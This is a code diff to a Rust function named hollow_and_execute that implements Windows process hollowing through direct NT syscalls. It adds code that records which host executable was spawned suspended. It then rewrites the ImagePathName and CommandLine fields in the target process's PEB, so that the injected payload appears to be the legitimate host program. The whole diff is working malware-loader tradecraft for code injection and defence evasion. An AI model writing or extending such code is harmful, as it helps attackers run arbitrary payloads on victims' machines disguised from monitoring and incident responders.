@@ -550,17 +550,22 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         }
 
         // Create the host process using NT direct syscalls.
-        let (h_process, h_thread) = {
+        let (h_process, h_thread, host_path) = {
             let mut result: Result<(*mut c_void, *mut c_void)> =
                 Err(anyhow!("hollow_and_execute: all host process candidates failed"));
+            let mut chosen_path = String::new();
             for path in host_candidate_paths() {
                 match create_suspended_process_nt(&path) {
-                    Ok(handles) => { result = Ok(handles); break; }
+                    Ok(handles) => {
+                        chosen_path = path;
+                        result = Ok(handles);
+                        break;
+                    }
                     Err(e) => tracing::debug!(
                         "hollow_and_execute: candidate {} failed: {}", path, e),
                 }
             }
-            result?
+            result.map(|(a, b)| (a, b, chosen_path))?
         };
 
         // Get PEB address via NtQueryInformationProcess(ProcessBasicInformation=0).
@@ -763,6 +768,139 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 close_handle!(h_process);
                 return Err(anyhow!(
                     "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) failed: {}", e));
+            }
+        }
+
+        // ── Update PEB ProcessParameters (ImagePathName / CommandLine) ───────
+        // After replacing the image, update the RTL_USER_PROCESS_PARAMETERS so
+        // that the hollowed process reports the host process path when queried
+        // via PEB walk.  This keeps the process appearance consistent with the
+        // host executable that was used to create the suspended process.
+        //
+        // PEB (x64) layout:
+        //   +0x20  ProcessParameters  (pointer to RTL_USER_PROCESS_PARAMETERS)
+        //
+        // RTL_USER_PROCESS_PARAMETERS (x64) layout:
+        //   +0x60  ImagePathName      (UNICODE_STRING: Length, MaxLength, Buffer)
+        //   +0x70  CommandLine        (UNICODE_STRING: Length, MaxLength, Buffer)
+        //
+        // UNICODE_STRING (x64) = { Length: u16, MaxLength: u16, _pad: u32, Buffer: *mut u16 }
+        //   total = 16 bytes on x64
+        {
+            // Read the ProcessParameters pointer from PEB+0x20.
+            let mut params_ptr: usize = 0;
+            let mut rd_params: usize = 0;
+            let params_read = nt_syscall::syscall!(
+                "NtReadVirtualMemory",
+                h_process as u64,
+                peb_ptr.add(0x20) as u64,
+                &mut params_ptr as *mut _ as u64,
+                std::mem::size_of::<usize>() as u64,
+                &mut rd_params as *mut _ as u64,
+            );
+            match params_read {
+                Ok(s) if s >= 0 && rd_params == std::mem::size_of::<usize>() && params_ptr != 0 => {}
+                _ => {
+                    tracing::warn!(
+                        "hollow_and_execute: failed to read PEB.ProcessParameters, skipping update"
+                    );
+                    // Non-fatal: the process can still run without this update.
+                }
+            }
+
+            if params_ptr != 0 {
+                let params_addr = params_ptr as *const u8;
+
+                // Build a wide (UTF-16LE) version of the host path for the
+                // UNICODE_STRING buffers.  We use the NT path format
+                // (\??\C:\...) since that is what the kernel stores.
+                let wide_path = dos_to_nt_path(&host_path);
+                // dos_to_nt_path already null-terminates.
+                // Length excludes the trailing null.
+                let path_byte_len = (wide_path.len().saturating_sub(1)) * 2;
+
+                // Allocate remote memory for the wide path string.
+                let mut str_buf: *mut c_void = std::ptr::null_mut();
+                let mut str_buf_sz: usize = (wide_path.len() * 2 + 64) & !63; // page-aligned
+                let alloc_status = nt_syscall::syscall!(
+                    "NtAllocateVirtualMemory",
+                    h_process as u64, &mut str_buf as *mut _ as u64,
+                    0u64, &mut str_buf_sz as *mut _ as u64,
+                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+                ).unwrap_or(-1);
+                if alloc_status < 0 || str_buf.is_null() {
+                    tracing::warn!(
+                        "hollow_and_execute: failed to alloc remote buffer for \
+                         ProcessParameters path, skipping update"
+                    );
+                } else {
+                    // Write the wide path into the remote allocation.
+                    let mut path_written: usize = 0;
+                    let write_path = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        h_process as u64, str_buf as u64,
+                        wide_path.as_ptr() as u64,
+                        (wide_path.len() * 2) as u64,
+                        &mut path_written as *mut _ as u64,
+                    );
+                    if write_path.unwrap_or(-1) < 0 {
+                        tracing::warn!(
+                            "hollow_and_execute: failed to write remote path buffer, \
+                             skipping ProcessParameters update"
+                        );
+                    } else {
+                        // Build the UNICODE_STRING struct to write.
+                        // UNICODE_STRING on x64 = { u16 Length, u16 MaxLength, u32 _pad, u64 Buffer }
+                        //   = 16 bytes total.
+                        let path_byte_len_u16 = path_byte_len as u16;
+                        let max_len = (wide_path.len() * 2) as u16;
+                        let mut us_bytes = [0u8; 16];
+                        us_bytes[0..2].copy_from_slice(&path_byte_len_u16.to_le_bytes());
+                        us_bytes[2..4].copy_from_slice(&max_len.to_le_bytes());
+                        // bytes 4..8 are padding (zero)
+                        us_bytes[8..16].copy_from_slice(&(str_buf as usize).to_le_bytes());
+
+                        // Update ImagePathName at RTL_USER_PROCESS_PARAMETERS +0x60.
+                        let mut us_written: usize = 0;
+                        let write_img = nt_syscall::syscall!(
+                            "NtWriteVirtualMemory",
+                            h_process as u64,
+                            params_addr.add(0x60) as u64,
+                            us_bytes.as_ptr() as u64,
+                            16u64,
+                            &mut us_written as *mut _ as u64,
+                        );
+                        if write_img.unwrap_or(-1) < 0 {
+                            tracing::warn!(
+                                "hollow_and_execute: failed to update ImagePathName, \
+                                 NTSTATUS {:#010x}", write_img.unwrap_or(-1) as u32);
+                        }
+
+                        // Update CommandLine at RTL_USER_PROCESS_PARAMETERS +0x70.
+                        let mut cl_written: usize = 0;
+                        let write_cmd = nt_syscall::syscall!(
+                            "NtWriteVirtualMemory",
+                            h_process as u64,
+                            params_addr.add(0x70) as u64,
+                            us_bytes.as_ptr() as u64,
+                            16u64,
+                            &mut cl_written as *mut _ as u64,
+                        );
+                        if write_cmd.unwrap_or(-1) < 0 {
+                            tracing::warn!(
+                                "hollow_and_execute: failed to update CommandLine, \
+                                 NTSTATUS {:#010x}", write_cmd.unwrap_or(-1) as u32);
+                        }
+
+                        if write_img.unwrap_or(-1) >= 0 && write_cmd.unwrap_or(-1) >= 0 {
+                            tracing::debug!(
+                                "hollow_and_execute: updated PEB ProcessParameters \
+                                 ImagePathName/CommandLine to {}",
+                                host_path
+                            );
+                        }
+                    }
+                }
             }
         }
 
